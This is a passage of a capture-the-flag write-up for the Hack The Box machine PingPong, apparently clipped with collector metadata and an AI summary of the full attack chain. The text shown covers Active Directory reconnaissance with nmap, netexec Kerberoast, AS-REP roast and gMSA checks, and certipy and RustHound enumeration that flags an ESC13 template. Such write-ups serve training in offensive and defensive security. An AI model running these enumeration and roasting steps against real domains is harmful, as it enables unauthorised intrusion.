---
title: "HTB: PingPong"
source: https://0xdf.gitlab.io/2026/11/21/htb-pingpong.html
source_host: 0xdf.gitlab.io
clip_date: 2026-11-22T02:39:38+08:00
trace_id: 7e0521b0-b618-4e8e-a5ad-816c9973fe9f
content_hash: 0654558fb3ea549c1da4e95142b801bce1f9621b87da1500f69ebfd611f90b64
status: synced
tags:
  - 内网渗透
  - ADCS
series: null
feed_source: 0xdf·HTB/逆向
ai_summary: 从头到尾利用双向林信任，用 ESC13 获得 WinRM 入口，再跨林读取 gMSA，绕过 JEA，用 RBCD 拿下第二域，最后返回第一域并利用 ESC4 取得 Administrator。
ai_summary_style: key-points
images_status:
  total: 31
  succeeded: 28
  failed_urls:
    - https://www.hackthebox.com/badge/image/480556
    - https://www.hackthebox.com/badge/image/1704836
    - https://www.hackthebox.com/badge/image/184611
notion_page_id: 41f75244-d011-81c5-83d5-f77998da6ecc
ioc:
  cves: []
  cwes: []
  hashes:
    - 04268c99f2fa7c1494eb690f151dbca811659fbb2f91507af68d14ea767299a4
    - 0b8ebfb6e9972babf9c01311748261a8
    - 12fb2b9eb168304707d6ef260269445089928f2861a8f58e54fea85e9ab5309e
    - 14f94b4b3deaabde802460945a2079e9
    - 17b3dbc9341f30adf89d67285bc5cb88
    - 1fc4a69c646ad7fe6537eedf7d08e55c93143cf4dd32ec1d27fcd9d007cb78ba
    - 208f13a06970095f1edd7942478afd6d34f3b3ccddcae627fdfc00c1b22502b8
    - 2475be69d40e815588a85fd89c7a439d
    - 24977a9c20ff0ae29914f4f882d9b0db
    - 2850c6e9dfa66b220c3e013edbb23580
    - 2dc83c2f510d420be2bf3692e9cb7371
    - 31d6cfe0d16ae931b73c59d7e0c089c0
    - 3ca116fdd0d280d751be4efee3eeea7b
    - 3dbc49f649cd0ed23ecd7d5071bcf00b
    - 3e6a72a9be1789fd6ea0b8b9b3306c19
    - 3fc94174d83a1bc9db957259e29130a9e19ccbef
    - 486c88bea5be139e8a271864ac2ff0216d7ccb003b5eb61f2976071490515848
    - 5261d93d06680fc00db5454eff3bcfc0
    - 537543f5f783db4a10f4df73e87ec7df9c692df7d970e3ee4be08c76fa53d5e7
    - 558139b55509c8a6fefe5f493f7a316cd6ab23b6eb1770c4a81934f25b6b700d
    - 61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98
    - 6282e2af4ca8f5ca935f84d03b486f2e6cc2a9b5c87fb0637a4449a44a8cd5f8
    - 63905deb12b527aadfdbc26d3f423eff
    - 647d77f0b0b0ebd22689a316339a4242044556182e3fb3c2b7bc5ffc29b1b8c4
    - 653c8cb750f25f9d74c0477616e542d5430cf6bee994b50161cf5d52f3bedfd0
    - 683ca376d7f86eea6472e88bf62d99c6
    - 69ba981c227f43ae62ce4ce3f60389f4
    - 6f8e726eefa64b894ce82d498bc27632
    - 6fa016af828999bda0e26861e00afb31
    - 725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6
    - 82d32219592d02188c9b9149308e5fb17185b4b44ebffa3b0681a189c7b7a523
    - 84f760fb477677510404ad7083852aa4
    - 8960e808108c23470cea0551d0399e8f
    - 8f07ec02fc56a32150d23fd0dbc353a3
    - 97cefa17dcaec66d9b52a97be398acf0
    - 989bd748ac8dd0b71ab24edccc9fc012
    - 9a9250fa13ba7f4c25e1a5576f5b8a03
    - 9b87341cfde9d6f5832be8fc6718126f
    - 9e5de13bde362ad5cc68a49d26301c3b
    - a24454d98e39a4a6d022b5d3e64c9e71
    - a3a9b0fa5a8dab39c2971bab470386a7
    - aa394100f064e1d1a6e0ad4366e0ea391358ba52
    - aad3b435b51404eeaad3b435b51404ee
    - b0f0baa47311cee88ca2b52b4e8ceb49
    - b89193e73905053e95fb2ad3b340cfdb
    - c0dfecbe5140831b99750a5c68f3ea55e3474d15caa3cc684c9a5c0be8fc4eab
    - cfad16d6a69c32b7a78a203485f740d132fb8713d1477d81162eac62ced1bf0b
    - d60175bfd5eb36551cd4a094fadb06ea
    - d60fc26a0569b953a5cebd1392232630
    - debc5c93eb20fca6eb01887a5f2104a8
    - deccbc15ace5cbf2d902f441783f1115
    - dee71f7ea0e118519be7765b9db41a65
    - df023cb090b82c55e3e18e5fbc7f9bc3
    - e034d0c375a79fa55f36bad49760fabf
    - e12246a7e57232eec29791ba3273a5b9
    - e15edce7e905644a94f0c34a0b05104e
    - e21d90eb3c651f4bfdf6606a4c07ffd5
    - e2823bb8675e717c06220991e69ac1b6
    - e550f93fa28e7d7196d98534c1a787ea
    - eb76ed05ee09e812ac2b1328f5b846afeafe69f9a1ba13f94f50ab3d8d524559
    - f1dc39ca727289c857163fb606b5aa41
    - f49491f9d40172069146a9c907e4d510
    - f540010f801f234d6e1373e5a628184bf658f87f8ac510ad772300d883b300a0
    - f9bd97d0d297630c1b1e85dd2a94a827332e2328d74141a6bafa0aa00aec0544
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 从头到尾利用双向林信任，用 ESC13 获得 WinRM 入口，再跨林读取 gMSA，绕过 JEA，用 RBCD 拿下第二域，最后返回第一域并利用 ESC4 取得 Administrator。
> 
> - **初始条件：** 目标是 ping.htb 的域控 DC1，仅支持 Kerberos，NTLM 被禁用，已提供 c.roberts / AssumedBreach123 凭据；需要先执行 ntpdate 校准时间，并让 krb5.conf 设置 dns_canonicalize_hostname = false。
> - **ESC13 入口：** TemporaryWinRM 模板的签发策略 OID 关联到空组 TempWinRMAccess，Domain Users 可注册，因此用 certipy req 申请证书，经 PKINIT 换取含该组 SID 的 TGT，再登录 WinRM 获取首台主机 shell。
> - **跨林取密码：** 通过跨林信任隧道连到 dc2.pong.htb（192.168.2.2），把全局组改为域本地组，以便跨信任加入自己的用户，从而获得读取 gMSA$ 密码的权限。
> - **JEA 逃逸：** gMSA 仅能访问受限 JEA 端点，通过脚本块逃逸后，在 PowerShell 历史文件中找到明文凭据。
> - **终结链：** 用 RBCD 以数据库管理员身份访问 MSSQL，用 GodPotato 提权拿下第二域；再回到 ping.htb 利用 SmartcardAuthentication 模板的 ESC4（也可手动修改 msPKI-Certificate-Name-Flag 转成 ESC1），为 Administrator 申请证书并取得 root.txt。

[HTB: PingPong](https://0xdf.gitlab.io/2026/11/21/htb-pingpong.html)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/pingpong-cover.webp)

PingPong is an assume breach Active Directory box with two forests joined by a bidirectional trust. I’ll abuse ESC13 to get a certificate whose issuance policy maps to a group with WinRM access, and get a shell on the first DC. From there, I’ll tunnel to the second forest, convert a global group to domain local so I can add my user from across the trust, and read a gMSA password. That gMSA account is limited to a constrained JEA endpoint, which I’ll escape with script blocks to find credentials in a PowerShell history file. With those, I’ll abuse resource-based constrained delegation to reach MSSQL as a database admin, and use GodPotato to compromise the second domain. Finally, I’ll cross back over the trust and abuse ESC4 to get Administrator on the first DC.

## Box Info

[![PingPong](https://0xdf.gitlab.io/icons/box-pingpong.webp)](https://hackthebox.com/machines/pingpong)

[PingPong](https://hackthebox.com/machines/pingpong)

Insane

Retire Date 21 Nov 2026

OS ![Windows](https://0xdf.gitlab.io/icons/Windows.webp)

Rated Difficulty ![Rated difficulty for PingPong](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/pingpong-diff.webp)

![Rated difficulty for PingPong](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/11a1024cf6d32b6e.png)

Radar Graph ![Radar chart for PingPong](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/pingpong-radar.webp)

![Radar chart for PingPong](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ac34738674dd3b03.png)

User

01:11:29 [xtk](https://app.hackthebox.com/users/480556)

![⚠️ 图片托管失败 · xtk](https://www.hackthebox.com/badge/image/480556)

Root

02:07:42 [ethicxz](https://app.hackthebox.com/users/1704836)

![⚠️ 图片托管失败 · ethicxz](https://www.hackthebox.com/badge/image/1704836)

Creator [Geiseric](https://app.hackthebox.com/users/184611)

![⚠️ 图片托管失败 · Geiseric](https://www.hackthebox.com/badge/image/184611)

Scenario

As is common in real life pentests, you will start the PingPong box with credentials for the following account c.roberts / AssumedBreach123

## Recon

### Initial Scanning

`nmap` finds 19 open TCP ports:

```bash
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.128.220
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-12 19:45 UTC
Nmap scan report for 10.129.128.220
Host is up, received echo-reply ttl 127 (0.021s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
56499/tcp open  unknown          syn-ack ttl 127
56628/tcp open  unknown          syn-ack ttl 127
56643/tcp open  unknown          syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds
oxdf@hacky$ sudo nmap -p 53,88,135,139,389,445,464,593,636,2179,3268,3269,5985,9389,49664,49670,56499,56628,56643 -sCV 10.129.128.220
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-12 19:55 UTC
Nmap scan report for 10.129.128.220
Host is up (0.021s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-13 03:55:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
56499/tcp open  msrpc         Microsoft Windows RPC
56628/tcp open  msrpc         Microsoft Windows RPC
56643/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 7h59m59s
| smb2-time:
|   date: 2026-11-13T03:56:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.15 seconds

```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `ping.htb`, and the hostname is `DC1`.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

```bash
oxdf@hacky$ netexec smb 10.129.128.220 --generate-hosts-file hosts 
SMB         10.129.128.220  445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
oxdf@hacky$ cat hosts /etc/hosts | sudo sponge /etc/hosts
oxdf@hacky$ head -1 /etc/hosts
10.129.128.220     dc1.ping.htb ping.htb dc1
```

I’ll also create the `krb5.conf` for this domain:

```css
oxdf@hacky$ netexec smb 10.129.128.220 --generate-krb5-file krb5.conf
SMB         10.129.128.220  445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.128.220  445    dc1              [+] krb5 conf saved to: krb5.conf
SMB         10.129.128.220  445    dc1              [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
oxdf@hacky$ sudo cp krb5.conf /etc/krb5.conf
```

I’ll also add `dns_canonicalize_hostname = false` to the `[libdefaults]` section of `/etc/krb5.conf`. By default, the system Kerberos library canonicalizes the hostname through DNS before building the service principal name, and that can produce a name that doesn’t match. With this set, it uses the hostname exactly as I give it.

All of the ports show a TTL of 127, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows one hop away. However, Windows regularly likes to proxy traffic to internal VMs in a way that doesn’t decrement the TTL, so this doesn’t rule that out. In fact, TCP 2179 is Hyper-V’s Virtual Machine Management Service, so there are likely VMs at play on this machine.

`nmap` notes a clock skew, so I’ll want to make sure to run `sudo ntpdate DC1.ping.htb` before any actions that use Kerberos auth.

### Initial Credentials

HackTheBox provides the following scenario associated with PingPong:

As is common in real life pentests, you will start the PingPong box with credentials for the following account c.roberts / AssumedBreach123

The creds return an error that shows the box doesn’t support NTLM authentication:

```css
oxdf@hacky$ netexec smb dc1.ping.htb -u c.roberts -p AssumedBreach123
SMB         10.129.128.220  445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.128.220  445    dc1              [-] ping.htb\c.roberts:AssumedBreach123 STATUS_NOT_SUPPORTED
```

With `-k` they do work:

```css
oxdf@hacky$ netexec smb dc1.ping.htb -u c.roberts -p AssumedBreach123 -k
SMB         dc1.ping.htb    445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc1.ping.htb    445    dc1              [+] ping.htb\c.roberts:AssumedBreach123 
```

They also work for LDAP:

```css
oxdf@hacky$ netexec ldap dc1.ping.htb -u c.roberts -p AssumedBreach123 -k
LDAP        dc1.ping.htb    389    DC1              [*] None (name:DC1) (domain:ping.htb) (signing:Unknown) (channel binding:Unknown) (NTLM:False)
LDAP        dc1.ping.htb    389    DC1              [+] ping.htb\c.roberts:AssumedBreach123
```

`netexec` doesn’t have a good way to check WinRM over Kerberos, but I can get a TGT and try:

```sql
oxdf@hacky$ getTGT.py ping.htb/c.roberts:AssumedBreach123
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.roberts.ccache
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache evil-winrm-py -i dc1.ping.htb -k
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc1.ping.htb:5985' as 'c.roberts@PING.HTB'
[-] Failed to authenticate the user None with kerberos
```

Unsurprisingly it fails.

Given that, I’ll want to prioritize things like:

-   SMB shares
-   ADCS
-   LDAP / BloodHound

### SMB - TCP 445

The shares on DC1 are the standard shares on a domain controller:

```sql
oxdf@hacky$ netexec smb DC1.ping.htb -u c.roberts -p AssumedBreach123 -k --shares
SMB         DC1.ping.htb    445    DC1              [*]  x64 (name:DC1) (domain:ping.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         DC1.ping.htb    445    DC1              [+] ping.htb\c.roberts:AssumedBreach123 
SMB         DC1.ping.htb    445    DC1              [*] Enumerated shares
SMB         DC1.ping.htb    445    DC1              Share           Permissions            Remark
SMB         DC1.ping.htb    445    DC1              -----           -----------            ------
SMB         DC1.ping.htb    445    DC1              ADMIN$                                 Remote Admin
SMB         DC1.ping.htb    445    DC1              C$                                     Default share
SMB         DC1.ping.htb    445    DC1              IPC$            READ                   Remote IPC
SMB         DC1.ping.htb    445    DC1              NETLOGON        READ                   Logon server share 
SMB         DC1.ping.htb    445    DC1              SYSVOL          READ                   Logon server share
```

Nothing interesting here.

### LDAP - TCP 389+

#### General LDAP Enumeration

I’ll check for Kerberoasting and AS-REP Roasting:

```css
oxdf@hacky$ netexec ldap dc1.ping.htb -u c.roberts -p AssumedBreach123 -k --kerberoast kerberoastLDAP
LDAP        dc1.ping.htb    389    DC1              [*] None (name:DC1) (domain:ping.htb) (signing:Unknown) (channel binding:Unknown) (NTLM:False)
LDAP        dc1.ping.htb    389    DC1              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc1.ping.htb    389    DC1              [*] Skipping disabled account: krbtgt
LDAP        dc1.ping.htb    389    DC1              [*] Total of records returned 0
oxdf@hacky$ netexec ldap dc1.ping.htb -u c.roberts -p AssumedBreach123 -k --asreproast asreproastLDAP
LDAP        dc1.ping.htb    389    DC1              [*] None (name:DC1) (domain:ping.htb) (signing:Unknown) (channel binding:Unknown) (NTLM:False)
LDAP        dc1.ping.htb    389    DC1              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc1.ping.htb    389    DC1              No entries found!
```

There is a gMSA account, gMSA$:

```css
oxdf@hacky$ netexec ldap dc1.ping.htb -u c.roberts -p AssumedBreach123 -k --gmsa
LDAP        dc1.ping.htb    389    DC1              [*] None (name:DC1) (domain:ping.htb) (signing:Unknown) (channel binding:Unknown) (NTLM:False)
LDAP        dc1.ping.htb    389    DC1              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc1.ping.htb    389    DC1              [*] Getting GMSA Passwords
LDAP        dc1.ping.htb    389    DC1              Account: gMSA$                NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: []
```

c.roberts can’t read the password (unsurprisingly), and currently no users are configured to read it.

#### ADCS

`netexec` will show there’s a certificate authority set up on this DC and the CA name:

```sql
oxdf@hacky$ netexec ldap dc1.ping.htb -u c.roberts -p AssumedBreach123 -k -M adcs
LDAP        dc1.ping.htb    389    DC1              [*] None (name:DC1) (domain:ping.htb) (signing:Unknown) (channel binding:Unknown) (NTLM:False)
LDAP        dc1.ping.htb    389    DC1              [+] ping.htb\c.roberts:AssumedBreach123 
ADCS        dc1.ping.htb    389    DC1              [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        dc1.ping.htb    389    DC1              Found PKI Enrollment Server: dc1.ping.htb
ADCS        dc1.ping.htb    389    DC1              Found CN: ping-DC1-CA
```

There is, with the name `ping-DC1-CA`. I’ll use `certipy` to look for vulnerable certificate templates:

```yaml
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache certipy find -vulnerable -stdout -k -target dc1.ping.htb -dc-host dc1.ping.htb -ns 10.129.128.220
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 1 OID linked to a template
[*] Retrieving CA configuration for 'ping-DC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'ping-DC1-CA'
[*] Checking web enrollment for CA 'ping-DC1-CA' @ 'dc1.ping.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ping-DC1-CA
    DNS Name                            : dc1.ping.htb
    Certificate Subject                 : CN=ping-DC1-CA, DC=ping, DC=htb
    Certificate Serial Number           : 6F8E726EEFA64B894CE82D498BC27632
    Certificate Validity Start          : 2026-04-20 18:54:41+00:00
    Certificate Validity End            : 2126-04-20 19:04:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : PING.HTB\Administrators
      Access Rights
        ManageCa                        : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        ManageCertificates              : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Enroll                          : PING.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : TemporaryWinRM
    Display Name                        : Temporary WinRM
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-23T17:19:28+00:00
    Template Last Modified              : 2025-12-27T21:12:15+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623
    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : PING.HTB\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

It calls out ESC13 on the TemporaryWinRM certificate template. That’s not a standard template, so I’ll want to keep that in mind.

#### BloodHound

I’ll collect BloodHound data with [RustHound-CE](https://github.com/g0h4n/RustHound-CE):

```rust
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache rusthound-ce -d ping.htb -k -f dc1.ping.htb --zip --ldaps
---------------------------------------------------
Initializing RustHound-CE at 22:41:40 on 11/13/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-13T22:41:40Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-13T22:41:40Z INFO  rusthound_ce] Collection method: All
[2026-11-13T22:41:40Z INFO  rusthound_ce::transport::ldap] Connected to PING.HTB Active Directory!
[2026-11-13T22:41:40Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-13T22:41:41Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=ping,DC=htb
[2026-11-13T22:41:41Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-13T22:41:41Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=ping,DC=htb
[2026-11-13T22:41:41Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-13T22:41:41Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=ping,DC=htb
[2026-11-13T22:41:41Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-13T22:41:41Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=ping,DC=htb
[2026-11-13T22:41:41Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-13T22:41:41Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Configuration,DC=ping,DC=htb
[2026-11-13T22:41:41Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 15%                                                                                                            
[2026-11-13T22:41:41Z INFO  rusthound_ce::objects::enterpriseca] Found 13 enabled certificate templates
[2026-11-13T22:41:41Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-11-13T22:41:41Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-11-13T22:41:41Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-11-13T22:41:41Z INFO  rusthound_ce::modules::session] [sessions] 0 active target(s) after expiry/enabled filter
[2026-11-13T22:41:41Z INFO  rusthound_ce::modules::session] [sessions] 0 session(s) enumerated in total across 0 host(s)
[2026-11-13T22:41:41Z INFO  rusthound_ce::modules] Starting ESC8 web enrollment probe on 1 CA(s)...
[2026-11-13T22:42:00Z INFO  rusthound_ce::modules::gpo::sysvol] [gpo] collected directives from 1 GPO(s) on dc1.ping.htb SYSVOL
[2026-11-13T22:42:00Z INFO  rusthound_ce::modules] [gpo] mapping 1 GPO(s) to GPOChanges / UserRights
[2026-11-13T22:42:00Z INFO  rusthound_ce::modules::localgroup] [localgroups] 0 active target(s) after expiry/enabled filter
[2026-11-13T22:42:00Z INFO  rusthound_ce::modules::localgroup] [localgroups] 0 edge(s) across 0 host(s)
[2026-11-13T22:42:00Z INFO  rusthound_ce::modules::webclient] [webclient] 0 active target(s) after expiry/enabled filter
[2026-11-13T22:42:00Z INFO  rusthound_ce::modules::registry] [careg] no password or NT hash available - not reading CA registry on 1 CA(s)
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 28 users parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 65 groups parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 2 domains parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 35 certtemplates parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] 4 issuancepolicies parsed!
[2026-11-13T22:42:00Z INFO  rusthound_ce::json::maker::common] .//20261113224200_ping-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 22:42:00 on 11/13/26! Happy Graphing!
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

I’ll upload that into a BloodHound-CE docker instance. I’ll mark c.roberts as owned, and look at their outbound control:

![BloodHound graph of c.roberts, a member of Domain Users, which can enroll in the TemporaryWinRM, User, UserSignature, ClientAuth, and EFS certificate templates](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/87e3aaf3187edb7f.png)

![BloodHound graph of c.roberts, a member of Domain Users, which can enroll in the TemporaryWinRM, User, UserSignature, ClientAuth, and EFS certificate templates](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-87e3aaf3187e.webp)

Nothing that doesn’t come from the Domain Users group, and all related to ADCS. There is a TempWinRMAccess group with no users. Having seen ESC13 in the `certipy` output, a bit of Cypher (thanks Claude) can link templates through their issuance policies to groups:

```
MATCH p=(t:CertTemplate)-[:ExtendedByPolicy]->(i:IssuancePolicy)-[:OIDGroupLink]->(g:Group)
RETURN p
```

That shows TemporaryWinRM links to the WinRM issuance policy which is linked to the TempWinRMAccess group:

